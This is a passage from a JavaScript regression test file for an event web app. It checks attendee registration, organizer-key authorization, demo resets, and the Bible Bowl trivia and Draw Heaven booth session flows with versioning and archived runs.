    attendeeId: "entry-c",
    phone: "6155550202",
    optionId: "future",
    optionTitle: "Keep me posted on future events",
  });
  const sharedOptionSignupId = res.body.signupId;
  res = await request(port, "confirmSignupInPerson", { signupId, confirmedBy: "staff" });
  assert.equal(res.status, 401);
  res = await request(port, "dashboardData", { organizerKey });
  assert.equal(res.body.signups.length, 3);
  assert.deepEqual(new Set(res.body.signups.map((signup) => signup.optionId)), new Set(["future", "bible"]));
  assert.equal(res.body.signups.filter((signup) => signup.optionId === "future").length, 2);
  assert.equal(res.body.signups.find((signup) => signup.id === signupId).confirmedInPerson, false);
  res = await request(port, "confirmSignupInPerson", { signupId, confirmedBy: "staff", organizerKey });
  assert.equal(res.status, 200);
  res = await request(port, "dashboardData", { organizerKey });
  assert.equal(res.body.signups.find((signup) => signup.id === signupId).confirmedInPerson, true);
  assert.equal(res.body.signups.find((signup) => signup.id === secondSignupId).confirmedInPerson, false);
  assert.equal(res.body.signups.find((signup) => signup.id === sharedOptionSignupId).confirmedInPerson, false);

  res = await request(port, "resetDemo", {});
  assert.equal(res.status, 401);
  res = await request(port, "dashboardData", { organizerKey });
  assert.equal(res.body.totals.registered, 3);
  res = await request(port, "resetDemo", { organizerKey });
  assert.equal(res.status, 200);
  assert.equal(res.body.ok, true);
  assertIsoTimestamp(res.body.dataResetAt, "data reset marker");
  const firstDataResetAt = res.body.dataResetAt;
  res = await request(port, "eventClock", {});
  assert.equal(res.body.mode, "live");
  assert.equal(res.body.controlled, true);
  assert.equal(res.body.dataResetAt, firstDataResetAt);
  assertIsoTimestamp(res.body.updatedAt, "demo clock updatedAt after data reset");
  assert.ok(
    Date.parse(res.body.updatedAt) > Date.parse(liveClockUpdatedAt),
    "data reset should version the unchanged clock state"
  );
  res = await request(port, "dashboardData", { organizerKey });
  assert.equal(res.body.totals.registered, 0);
  const resetBackup = JSON.parse(fs.readFileSync(`${testDb}.bak`, "utf8"));
  assert.equal(resetBackup.attendees.length, 0);
  assert.equal(resetBackup.boothCheckins.length, 0);
  assert.equal(resetBackup.songVotes.length, 0);
  assert.equal(resetBackup.dataResetAt, firstDataResetAt);
  fs.writeFileSync(testDb, "{corrupted after reset", "utf8");
  res = await request(port, "health", undefined, "GET");
  assert.equal(res.status, 200);
  assert.equal(res.body.registered, 0);
  assert.equal("sms" in res.body, false);
  res = await request(port, "boothPresentation", { boothId: "art" });
  assert.equal(res.body.status, "waiting");
  assert.equal(res.body.version, 0);
  res = await request(port, "myCheckins", { attendeeId: "entry-a" });
  assert.equal(res.status, 404);
  assert.equal(res.body.code, "ATTENDEE_NOT_FOUND");
  const recoveredA = await registerPhoneAttendee(
    port, "entry-a", "Avery Again", "6155550301"
  );
  assert.equal(recoveredA.raffleNumber, "1001");
  const recoveredZ = await registerPhoneAttendee(
    port, "entry-z", "Avery Again", "6155550302"
  );
  assert.equal(recoveredZ.raffleNumber, "1002");
  res = await request(port, "loginAttendee", {
    name: "avery again",
    phone: "6155550301",
    portal: "phase3",
  });
  assert.equal(res.body.attendeeId, "entry-a");
  res = await request(port, "loginAttendee", {
    name: "Avery Again",
    phone: "6155550302",
    portal: "phase3",
  });
  assert.equal(res.body.attendeeId, "entry-z");

  // Name + phone is the identity pair: household members may share a phone,
  // while the exact same pair recovers the existing attendee.
  res = await request(port, "registerAttendee", {
    attendeeId: "entry-household", name: "Blake", phone: "6155550301",
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.isNew, true);
  assert.equal(res.body.raffleNumber, "1003");
  assert.equal(res.body.attendeeId, "entry-household");
  res = await request(port, "loginAttendee", {
    name: "Blake", phone: "6155550301", portal: "phase3",
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.attendeeId, "entry-household");
  res = await request(port, "loginAttendee", {
    name: "Avery Again", phone: "6155550301", portal: "phase3",
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.attendeeId, "entry-a");

  const sharedPhoneDb = JSON.parse(fs.readFileSync(testDb, "utf8"));
  assert.equal("otpChallenges" in sharedPhoneDb, false);
  sharedPhoneDb.attendees.forEach((attendee) => {
    assert.equal("phoneVerifiedAt" in attendee, false);
    assert.equal("phoneVerificationRequired" in attendee, false);
  });
  const sharedPhoneSnapshot = buildExportSnapshot(sharedPhoneDb, {
    generatedAt: "2026-07-18T22:15:00.000Z",
  });
  const sharedPhoneRows = sharedPhoneSnapshot.tabs.Attendees.rows.map((_, index) => (
    sheetRowObject(sharedPhoneSnapshot, "Attendees", index)
  ));
  assert.deepEqual(
    sharedPhoneRows
      .filter((row) => row.phone === "(615) 555-0301")
      .map((row) => [row.attendeeId, row.name])
      .sort((a, b) => a[0].localeCompare(b[0])),
    [["entry-a", "Avery Again"], ["entry-household", "Blake"]]
  );
  res = await request(port, "submitSignup", {
    attendeeId: "entry-z",
    phone: "",
    optionId: "future",
    optionTitle: "Keep me posted on future events",
  });
  assert.equal(res.status, 200);

  for (const pathname of [
    "/phase1-entry/index.html",
    "/phase2-booths/hub.html",
    "/phase2-booths/booth-heaven.html",
    "/phase2-booths/booth-trivia.html",
    "/phase2-booths/booth-story.html",
    "/phase2-booths/booth-art.html",
    "/phase2-booths/booth-newsong.html",
    "/phase2-booths/kiosk-art.html",
    "/phase2-booths/kiosk-newsong.html",
    "/phase3-signup/index.html",
    "/done/index.html",
    "/phase2-staff/index.html",
    "/phase2-staff/heaven.html",
    "/phase2-staff/trivia.html",
    "/phase2-staff/story.html",
    "/phase2-staff/art.html",
    "/phase2-staff/newsong.html",
  ]) {
    const page = await getPage(port, pathname);
    assert.equal(page.status, 200, pathname);
    assert.match(page.body, /<!DOCTYPE html>/i, pathname);
    assert.equal(page.headers["cache-control"], "no-store", pathname);
  }
  const identityBundle = await getPage(port, "/shared/identity.js");
  assert.equal(identityBundle.status, 200);
  assert.equal(identityBundle.headers["cache-control"], "no-store");
  const attendeeReturnLink = await getPage(port, "/attend?preview=1");
  assert.equal(attendeeReturnLink.status, 302);
  assert.equal(attendeeReturnLink.headers.location, "/phase1-entry/index.html?preview=1&resume=1");

  const newSongArtwork = await getPage(port, "/assets/revelation-14-3-new-song.webp");
  assert.equal(newSongArtwork.status, 200);
  assert.equal(newSongArtwork.headers["content-type"], "image/webp");
  assert.ok(newSongArtwork.body.length > 1000, "New Song verse artwork should not be empty");

  const artTherapyArtwork = await getPage(port, "/assets/art-therapy-heart-and-mind.jpeg");
  assert.equal(artTherapyArtwork.status, 200);
  assert.equal(artTherapyArtwork.headers["content-type"], "image/jpeg");
  assert.ok(artTherapyArtwork.body.length > 10000, "Art Therapy artwork should not be empty");

  res = await request(port, "dashboardData", undefined, "GET");
  assert.equal(res.status, 404);
}

async function runTriviaApiRegression(port) {
  const organizerKey = "test-organizer-key";
  const sessionSummary = (dashboard, sessionNumber) => (
    dashboard.sessions.find((session) => session.sessionNumber === sessionNumber)
  );
  const advance = (sessionNumber, action, version, key = organizerKey) => request(
    port,
    "advanceTriviaSession",
    { sessionNumber, action, version, organizerKey: key }
  );

  let res = await request(port, "resetDemo", { organizerKey });
  assert.equal(res.status, 200);
  res = await request(port, "setDemoClock", {
    mode: "before",
    targetIso: "2026-07-18T20:05:00.000Z",
    organizerKey,
  });
  assert.equal(res.status, 200);

  async function registerTriviaAttendee(attendeeId, name, wristbandColor) {
    const registration = await request(port, "registerAttendee", { attendeeId, name, organizerKey });
    assert.equal(registration.status, 200);
    const confirmation = await request(port, "confirmWristband", {
      attendeeId, wristbandColor, organizerKey,
    });
    assert.equal(confirmation.status, 200);
    return registration.body;
  }

  await registerTriviaAttendee("trivia-red-a", "Red Reader", "red");
  await registerTriviaAttendee("trivia-red-b", "Red Scholar", "red");
  await registerTriviaAttendee("trivia-blue-a", "Blue Scholar", "blue");

  res = await request(port, "setDemoClock", {
    mode: "session1",
    targetIso: "2026-07-18T20:15:00.000Z",
    organizerKey,
  });
  assert.equal(res.status, 200);

  // Staff controls and every session leaderboard are protected. Both
  // rotations begin independently on the welcome screen.
  res = await request(port, "triviaDashboardData", { organizerKey: "wrong" });
  assert.equal(res.status, 401);
  assert.equal(res.body.code, "AUTH_REQUIRED");
  res = await advance(1, "start", 0, "wrong");
  assert.equal(res.status, 401);
  assert.equal(res.body.code, "AUTH_REQUIRED");
  res = await request(port, "resetTriviaSession", { sessionNumber: 1, organizerKey: "wrong" });
  assert.equal(res.status, 401);
  assert.equal(res.body.code, "AUTH_REQUIRED");
  res = await advance(2, "start", 0);
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "BOOTH_SESSION_NOT_ACTIVE");
  res = await advance(3, "start", 0);
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_TRIVIA_SESSION");

  res = await request(port, "triviaDashboardData", { organizerKey });
  assert.equal(res.status, 200);
  assert.equal(res.body.sessions.length, 2);
  assert.deepEqual(
    res.body.sessions.map((session) => [
      session.sessionNumber,
      session.assignedColor.id,
      session.state.phase,
      session.state.version,
      session.leaderboard.length,
    ]),
    [
      [1, "red", "welcome", 0, 0],
      [2, "blue", "welcome", 0, 0],
    ]
  );

  // Only the wristband group assigned to Bible Bowl in the current timed
  // session can read or answer its game.
  res = await request(port, "triviaState", { attendeeId: "trivia-red-a" });
  assert.equal(res.status, 200);
  assert.equal(res.body.sessionNumber, 1);
  assert.equal(res.body.phase, "welcome");
  assert.equal(res.body.question, null);
  assert.equal(res.body.answer, null);
  assert.equal(res.body.correctAnswer, null);
  assert.deepEqual(res.body.topThree, []);
  assert.deepEqual(res.body.score, {
    correctCount: 0,
    answeredCount: 0,
    totalQuestions: TRIVIA_QUESTIONS.length,
  });
  res = await request(port, "triviaState", { attendeeId: "trivia-blue-a" });
  assert.equal(res.status, 403);
  assert.equal(res.body.code, "TRIVIA_NOT_ASSIGNED");
  res = await request(port, "completeTrivia", { attendeeId: "trivia-red-a" });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "TRIVIA_NOT_COMPLETE");

  // Invalid transitions do not mutate the session. Optimistic versions stop
  // two staff tabs or rapid taps from advancing the speaker twice.
  res = await advance(1, "reveal", 0);
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "INVALID_TRIVIA_TRANSITION");
  res = await advance(1, "start", 99);
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "TRIVIA_SESSION_CONFLICT");
  res = await advance(1, "start", 0);
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "question");
  assert.equal(res.body.state.questionIndex, 0);
  assert.equal(res.body.state.version, 1);
  assert.equal(res.body.question.correctIndex, TRIVIA_QUESTIONS[0].correctIndex);
  res = await advance(1, "start", 0);
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "TRIVIA_SESSION_CONFLICT");

  // The open-question attendee response deliberately withholds the answer
  // key. Answer correctness also remains hidden until the leader reveals it.
  res = await request(port, "triviaState", { attendeeId: "trivia-red-a" });
  assert.equal(res.status, 200);
  assert.equal(res.body.phase, "question");
  assert.equal(res.body.version, 1);
  assert.equal(res.body.question.id, TRIVIA_QUESTIONS[0].id);
  assert.equal("correctIndex" in res.body.question, false);
  assert.equal("correctText" in res.body.question, false);
  assert.equal(res.body.correctAnswer, null);

  const correctAnswerIndex = TRIVIA_QUESTIONS[0].correctIndex;
  const wrongAnswerIndex = correctAnswerIndex === 0 ? 1 : 0;
  res = await request(port, "submitTriviaAnswer", {
    attendeeId: "trivia-red-a",
    questionId: TRIVIA_QUESTIONS[0].id,
    answerIndex: correctAnswerIndex,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.idempotent, false);
  assert.equal("isCorrect" in res.body, false);
  const firstAnsweredAt = res.body.answeredAt;
  assertIsoTimestamp(firstAnsweredAt, "first Bible Bowl answer timestamp");
  res = await request(port, "submitTriviaAnswer", {
    attendeeId: "trivia-red-a",
    questionId: TRIVIA_QUESTIONS[0].id,
    answerIndex: correctAnswerIndex,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.idempotent, true);
  assert.equal(res.body.answeredAt, firstAnsweredAt);
  res = await request(port, "submitTriviaAnswer", {
    attendeeId: "trivia-red-a",
    questionId: TRIVIA_QUESTIONS[0].id,
    answerIndex: wrongAnswerIndex,
  });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "TRIVIA_ANSWER_LOCKED");
  res = await request(port, "submitTriviaAnswer", {
    attendeeId: "trivia-red-b",
    questionId: TRIVIA_QUESTIONS[0].id,
    answerIndex: wrongAnswerIndex,
  });
  assert.equal(res.status, 200);

  res = await request(port, "triviaState", { attendeeId: "trivia-red-a" });
  assert.deepEqual(res.body.answer, { answerIndex: correctAnswerIndex });
  assert.equal(res.body.correctAnswer, null);
  assert.equal(res.body.score.correctCount, 0, "an unrevealed answer must not affect the visible score");
  assert.equal(res.body.score.answeredCount, 1);

  res = await advance(1, "reveal", 1);
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "reveal");
  assert.equal(res.body.state.version, 2);
  res = await request(port, "submitTriviaAnswer", {
    attendeeId: "trivia-red-b",
    questionId: TRIVIA_QUESTIONS[0].id,
    answerIndex: wrongAnswerIndex,
  });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "TRIVIA_ANSWER_CLOSED");

  const redAReveal = await request(port, "triviaState", { attendeeId: "trivia-red-a" });
  const redBReveal = await request(port, "triviaState", { attendeeId: "trivia-red-b" });
  assert.equal(redAReveal.body.phase, "reveal");
  assert.deepEqual(redAReveal.body.correctAnswer, {
    answerIndex: correctAnswerIndex,
    text: TRIVIA_QUESTIONS[0].choices[correctAnswerIndex],
  });
  assert.deepEqual(redAReveal.body.answer, { answerIndex: correctAnswerIndex, isCorrect: true });
  assert.equal(redAReveal.body.score.correctCount, 1);
  assert.deepEqual(redBReveal.body.answer, { answerIndex: wrongAnswerIndex, isCorrect: false });
  assert.equal(redBReveal.body.score.correctCount, 0);

  // Next opens exactly one new question. Finishing after its reveal is a
  // supported early ending, and the denominator is the two revealed questions
  // rather than the full question bank.
  res = await advance(1, "next", 2);
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "question");
  assert.equal(res.body.state.questionIndex, 1);
  assert.equal(res.body.state.version, 3);
  res = await request(port, "completeTrivia", { attendeeId: "trivia-red-a" });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "TRIVIA_NOT_COMPLETE");
  res = await advance(1, "reveal", 3);
  assert.equal(res.status, 200);
  assert.equal(res.body.state.version, 4);
  res = await advance(1, "finish", 4);
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "complete");
  assert.equal(res.body.state.version, 5);

  res = await request(port, "triviaState", { attendeeId: "trivia-red-a" });
  assert.equal(res.status, 200);
  assert.equal(res.body.phase, "complete");
  assert.deepEqual(
    res.body.topThree.map((row) => [row.rank, row.name, row.correctCount, row.totalQuestions]),
    [[1, "Red Reader", 1, 2], [2, "Red Scholar", 0, 2]]
  );

  res = await request(port, "completeTrivia", { attendeeId: "trivia-red-a" });
  assert.equal(res.status, 200);
  assert.deepEqual(res.body.score, { correctCount: 1, answeredCount: 1, totalQuestions: 2 });
  res = await request(port, "completeTrivia", { attendeeId: "trivia-red-b" });
  assert.equal(res.status, 200);
  assert.deepEqual(res.body.score, { correctCount: 0, answeredCount: 1, totalQuestions: 2 });

  res = await request(port, "triviaDashboardData", { organizerKey });
  let session1 = sessionSummary(res.body, 1);
  let session2 = sessionSummary(res.body, 2);
  assert.equal(session1.state.phase, "complete");
  assert.deepEqual(
    session1.leaderboard.map((row) => [row.name, row.correctCount, row.answeredCount, row.totalQuestions]),
    [
      ["Red Reader", 1, 1, 2],
      ["Red Scholar", 0, 1, 2],
    ]
  );
  assert.equal(session2.state.phase, "welcome");
  assert.deepEqual(session2.leaderboard, []);

  // Session 2 has its own state and full-length score. Session 1 remains
  // queryable and unchanged while the clock and attendee group move on.
  res = await request(port, "setDemoClock", {
    mode: "session2",
    targetIso: "2026-07-18T20:35:00.000Z",
    organizerKey,
  });
  assert.equal(res.status, 200);
  res = await request(port, "triviaState", { attendeeId: "trivia-blue-a" });
  assert.equal(res.status, 200);
  assert.equal(res.body.sessionNumber, 2);
  assert.equal(res.body.phase, "welcome");
  res = await request(port, "triviaState", { attendeeId: "trivia-red-a" });
  assert.equal(res.status, 403);
  assert.equal(res.body.code, "TRIVIA_NOT_ASSIGNED");

  res = await advance(2, "start", 0);
  assert.equal(res.status, 200);
  let session2Version = res.body.state.version;
  for (let questionIndex = 0; questionIndex < TRIVIA_QUESTIONS.length; questionIndex += 1) {
    const question = TRIVIA_QUESTIONS[questionIndex];
    const openState = await request(port, "triviaState", { attendeeId: "trivia-blue-a" });
    assert.equal(openState.status, 200);
    assert.equal(openState.body.phase, "question");
    assert.equal(openState.body.question.id, question.id);
    assert.equal(openState.body.correctAnswer, null);
    assert.equal("correctIndex" in openState.body.question, false);

    const answer = await request(port, "submitTriviaAnswer", {
      attendeeId: "trivia-blue-a",
      questionId: question.id,
      answerIndex: question.correctIndex,
    });
    assert.equal(answer.status, 200);

    const reveal = await advance(2, "reveal", session2Version);
    assert.equal(reveal.status, 200);
    assert.equal(reveal.body.state.phase, "reveal");
    session2Version = reveal.body.state.version;

    const revealedState = await request(port, "triviaState", { attendeeId: "trivia-blue-a" });
    assert.equal(revealedState.body.answer.isCorrect, true);
    assert.equal(revealedState.body.correctAnswer.answerIndex, question.correctIndex);

    if (questionIndex < TRIVIA_QUESTIONS.length - 1) {
      const next = await advance(2, "next", session2Version);
      assert.equal(next.status, 200);
      assert.equal(next.body.state.questionIndex, questionIndex + 1);
      session2Version = next.body.state.version;
    }
  }

  res = await advance(2, "next", session2Version);
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "TRIVIA_LAST_QUESTION");
  res = await advance(2, "finish", session2Version);
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "complete");
  res = await request(port, "completeTrivia", { attendeeId: "trivia-blue-a" });
  assert.equal(res.status, 200);
  assert.deepEqual(res.body.score, {
    correctCount: TRIVIA_QUESTIONS.length,
    answeredCount: TRIVIA_QUESTIONS.length,
    totalQuestions: TRIVIA_QUESTIONS.length,
  });

  res = await request(port, "triviaDashboardData", { organizerKey });
  session1 = sessionSummary(res.body, 1);
  session2 = sessionSummary(res.body, 2);
  assert.deepEqual(session1.leaderboard.map((row) => row.name), ["Red Reader", "Red Scholar"]);
  const triviaSession1Run1Id = session1.state.runId;
  assert.equal(session1.state.runNumber, 1);
  assert.equal(session2.leaderboard.length, 1);
  assert.deepEqual(
    [session2.leaderboard[0].name, session2.leaderboard[0].correctCount, session2.leaderboard[0].totalQuestions],
    ["Blue Scholar", TRIVIA_QUESTIONS.length, TRIVIA_QUESTIONS.length]
  );

  // Starting another game archives the completed run instead of deleting its
  // answers. The active leaderboard resets cleanly while the prior run stays
  // available to staff, and another session remains unchanged.
  res = await request(port, "resetTriviaSession", { sessionNumber: 1, organizerKey });
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "welcome");
  assert.equal(res.body.state.runNumber, 2);
  assert.notEqual(res.body.state.runId, triviaSession1Run1Id);
  assert.deepEqual(res.body.leaderboard, []);
  assert.equal(res.body.archivedRuns.length, 1);
  assert.equal(res.body.archivedRuns[0].runId, triviaSession1Run1Id);
  assert.equal(res.body.archivedRuns[0].runNumber, 1);
  assert.equal(res.body.archivedRuns[0].phase, "complete");
  assert.equal(res.body.archivedRuns[0].participantCount, 2);
  assert.equal(res.body.archivedRuns[0].responseCount, 2);
  assert.deepEqual(
    res.body.archivedRuns[0].leaderboard.map((row) => [row.name, row.correctCount]),
    [["Red Reader", 1], ["Red Scholar", 0]]
  );
  const triviaSession1Run2Id = res.body.state.runId;
  const triviaSession1Run2Version = res.body.state.version;
  res = await request(port, "triviaDashboardData", { organizerKey });
  assert.deepEqual(sessionSummary(res.body, 1).leaderboard, []);
  assert.equal(sessionSummary(res.body, 1).archivedRuns.length, 1);
  assert.equal(sessionSummary(res.body, 2).state.phase, "complete");
  assert.equal(sessionSummary(res.body, 2).leaderboard.length, 1);

  // The same attendee can answer the same question in the fresh run. State,
  // idempotency, and scoring are keyed by runId rather than leaking run 1.
  res = await request(port, "setDemoClock", {
    mode: "session1",
    targetIso: "2026-07-18T20:15:00.000Z",
    organizerKey,
  });
  assert.equal(res.status, 200);
  res = await request(port, "triviaState", { attendeeId: "trivia-red-a" });
  assert.equal(res.status, 200);
  assert.equal(res.body.runId, triviaSession1Run2Id);
  assert.equal(res.body.runNumber, 2);
  assert.equal(res.body.answer, null);
  assert.equal(res.body.score.correctCount, 0);
  assert.equal(res.body.score.answeredCount, 0);
  res = await advance(1, "start", triviaSession1Run2Version);
  assert.equal(res.status, 200);
  let triviaSession1Run2ActiveVersion = res.body.state.version;
  res = await request(port, "submitTriviaAnswer", {
    attendeeId: "trivia-red-a",
    questionId: TRIVIA_QUESTIONS[0].id,
    answerIndex: TRIVIA_QUESTIONS[0].correctIndex,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.idempotent, false);
  assert.equal(res.body.runId, triviaSession1Run2Id);
  res = await advance(1, "reveal", triviaSession1Run2ActiveVersion);
  assert.equal(res.status, 200);
  triviaSession1Run2ActiveVersion = res.body.state.version;
  res = await advance(1, "finish", triviaSession1Run2ActiveVersion);
  assert.equal(res.status, 200);
  res = await request(port, "completeTrivia", { attendeeId: "trivia-red-a" });
  assert.equal(res.status, 200);
  assert.equal(res.body.runId, triviaSession1Run2Id);
  assert.deepEqual(res.body.score, { correctCount: 1, answeredCount: 1, totalQuestions: 1 });

  // Resetting the second game archives it as well; history is newest-first and
  // the original two-player run remains fully intact.
  res = await request(port, "resetTriviaSession", { sessionNumber: 1, organizerKey });
  assert.equal(res.status, 200);
  assert.equal(res.body.state.runNumber, 3);
  assert.equal(res.body.state.phase, "welcome");
  assert.deepEqual(res.body.leaderboard, []);
  assert.deepEqual(res.body.archivedRuns.map((run) => [run.runNumber, run.phase]), [
    [2, "complete"],
    [1, "complete"],
  ]);
  assert.equal(res.body.archivedRuns[0].runId, triviaSession1Run2Id);
  assert.equal(res.body.archivedRuns[0].participantCount, 1);
  assert.equal(res.body.archivedRuns[0].responseCount, 1);
  assert.equal(res.body.archivedRuns[1].runId, triviaSession1Run1Id);
  assert.equal(res.body.archivedRuns[1].participantCount, 2);

  res = await request(port, "setDemoClock", {
    mode: "waiting",
    targetIso: "2026-07-18T20:50:00.000Z",
    organizerKey,
  });
  assert.equal(res.status, 200);
  res = await request(port, "triviaState", { attendeeId: "trivia-red-a" });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "TRIVIA_SESSION_CLOSED");
  res = await advance(1, "start", 0);
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "BOOTH_SESSION_NOT_ACTIVE");

  // The protected overall reset is the only destructive reset; it removes
  // every active game, archived game, answer, leaderboard, and completion.
  res = await request(port, "resetDemo", { organizerKey });
  assert.equal(res.status, 200);
  res = await request(port, "triviaDashboardData", { organizerKey });
  assert.deepEqual(
    res.body.sessions.map((session) => [session.state.phase, session.state.version, session.leaderboard.length]),
    [["welcome", 0, 0], ["welcome", 0, 0]]
  );
  const resetDb = JSON.parse(fs.readFileSync(testDb, "utf8"));
  assert.deepEqual(resetDb.triviaSessions, {});
  assert.deepEqual(resetDb.triviaAnswers, []);
  assert.deepEqual(resetDb.triviaRunHistory, []);
  assert.equal(resetDb.boothCheckins.length, 0);
}

async function runHeavenApiRegression(port) {
  const organizerKey = "test-organizer-key";
  const confirmationActions = [
    "drawing_complete", "description_yes", "size_yes", "impact_yes", "programs_done",
  ];
  const emptyConfirmations = Object.fromEntries(confirmationActions.map((action) => [action, false]));
  const sessionSummary = (dashboard, sessionNumber) => (
    dashboard.sessions.find((session) => session.sessionNumber === sessionNumber)
  );
  const advance = (sessionNumber, action, version, key = organizerKey) => request(
    port,
    "advanceHeavenSession",
    { sessionNumber, action, version, organizerKey: key }
  );

  let res = await request(port, "resetDemo", { organizerKey });
  assert.equal(res.status, 200);
  res = await request(port, "setDemoClock", {
    mode: "before",
    targetIso: "2026-07-18T20:05:00.000Z",
    organizerKey,
  });
  assert.equal(res.status, 200);

  async function registerHeavenAttendee(attendeeId, name, wristbandColor) {
    const registration = await request(port, "registerAttendee", { attendeeId, name, organizerKey });
    assert.equal(registration.status, 200);
    const confirmation = await request(port, "confirmWristband", {
      attendeeId, wristbandColor, organizerKey,
    });
    assert.equal(confirmation.status, 200);
    return registration.body;
  }

  await registerHeavenAttendee("heaven-blue-a", "Blue Artist", "blue");
  await registerHeavenAttendee("heaven-blue-b", "Blue Dreamer", "blue");
  await registerHeavenAttendee("heaven-red-a", "Red Artist", "red");
  await registerHeavenAttendee("heaven-green-a", "Green Artist", "green");

  // The attendee API is also tied to the shared timed rotation. A leader may
  // prepare controls before the event, but attendee confirmations stay closed
  // in the waiting lobby and for wristbands assigned to another booth.
  res = await request(port, "setDemoClock", {
    mode: "before",
    targetIso: "2026-07-18T20:05:00.000Z",
    organizerKey,
  });
  assert.equal(res.status, 200);
  res = await request(port, "heavenState", { attendeeId: "heaven-blue-a" });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "HEAVEN_SESSION_CLOSED");

  res = await request(port, "setDemoClock", {
    mode: "session1",
    targetIso: "2026-07-18T20:15:00.000Z",
    organizerKey,
  });
  assert.equal(res.status, 200);

  // Staff reads, transitions, and resets are protected. Both Draw
  // Heaven rotations start with independent run 1 welcome states.
  res = await request(port, "heavenDashboardData", { organizerKey: "wrong" });
  assert.equal(res.status, 401);
  assert.equal(res.body.code, "AUTH_REQUIRED");
  res = await advance(1, "start", 0, "wrong");
  assert.equal(res.status, 401);
  assert.equal(res.body.code, "AUTH_REQUIRED");
  res = await request(port, "resetHeavenSession", {
    sessionNumber: 1,
    organizerKey: "wrong",
  });
  assert.equal(res.status, 401);
  assert.equal(res.body.code, "AUTH_REQUIRED");
  res = await advance(2, "start", 0);
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "BOOTH_SESSION_NOT_ACTIVE");
  res = await advance(3, "start", 0);
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_HEAVEN_SESSION");
  res = await request(port, "heavenDashboardData", { organizerKey });
  assert.equal(res.status, 200);
  assert.equal(res.body.sessions.length, 2);
  assert.deepEqual(
    res.body.sessions.map((session) => [
      session.sessionNumber,
      session.assignedColor.id,
      session.state.phase,
      session.state.runNumber,
      session.participantCount,
      session.archivedRuns.length,
    ]),
    [
      [1, "blue", "welcome", 1, 0, 0],
      [2, "red", "welcome", 1, 0, 0],
    ]
  );
  assert.deepEqual(res.body.sessions.map((session) => session.assignedCount), [2, 1]);

  res = await request(port, "heavenState", { attendeeId: "heaven-blue-a" });
  assert.equal(res.status, 200);
  assert.equal(res.body.sessionNumber, 1);
  assert.equal(res.body.assignedColor.id, "blue");
  assert.equal(res.body.phase, "welcome");
  assert.equal(res.body.version, 0);
  assert.equal(res.body.runNumber, 1);
  assert.equal(typeof res.body.runId, "string");
  assert.deepEqual(res.body.participant.confirmations, emptyConfirmations);
  assert.deepEqual(res.body.participant.confirmedAt, {});
  assert.equal("participants" in res.body, false);
  const session1Run1Id = res.body.runId;

  res = await request(port, "heavenState", { attendeeId: "heaven-red-a" });
  assert.equal(res.status, 403);
  assert.equal(res.body.code, "HEAVEN_NOT_ASSIGNED");
  res = await request(port, "confirmHeavenStep", {
    attendeeId: "heaven-blue-a",
    action: "drawing_complete",
  });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "HEAVEN_CONFIRMATION_CLOSED");

  // Invalid controls and stale versions never move the speaker. Only the
  // legal action for the current global phase can advance every attendee.
  res = await request(port, "advanceHeavenSession", {
    sessionNumber: 4,
    action: "start",
    version: 0,
    organizerKey,
  });
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_HEAVEN_SESSION");
  res = await advance(1, "not_an_action", 0);
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_HEAVEN_ACTION");
  res = await advance(1, "show_verse", 0);
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "INVALID_HEAVEN_TRANSITION");
  res = await advance(1, "start", 99);
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "HEAVEN_SESSION_CONFLICT");
  res = await advance(1, "start", 0);
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "drawing");
  assert.equal(res.body.state.version, 1);
  assert.equal(res.body.state.runId, session1Run1Id);
  assertIsoTimestamp(res.body.state.startedAt, "Draw Heaven run start");
  res = await advance(1, "start", 0);
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "HEAVEN_SESSION_CONFLICT");

  // The first drawing confirmation unlocks the description response for that
  // attendee only. Repeating a confirmation is idempotent and preserves its
  // original timestamp, including after a refresh or leader phase change.
  res = await request(port, "confirmHeavenStep", {
    attendeeId: "heaven-blue-a",
    action: "invalid",
  });
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_HEAVEN_CONFIRMATION");
  res = await request(port, "confirmHeavenStep", {
    attendeeId: "heaven-blue-a",
    action: "description_yes",
  });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "HEAVEN_CONFIRMATION_PREREQUISITE");

  res = await request(port, "confirmHeavenStep", {
    attendeeId: "heaven-blue-a",
    action: "drawing_complete",
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.idempotent, false);
  const firstDrawingConfirmedAt = res.body.confirmedAt;
  assertIsoTimestamp(firstDrawingConfirmedAt, "first Draw Heaven confirmation");
  assert.equal(res.body.state.participant.confirmations.drawing_complete, true);
  res = await request(port, "confirmHeavenStep", {
    attendeeId: "heaven-blue-a",
    action: "drawing_complete",
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.idempotent, true);
  assert.equal(res.body.confirmedAt, firstDrawingConfirmedAt);

  res = await request(port, "confirmHeavenStep", {
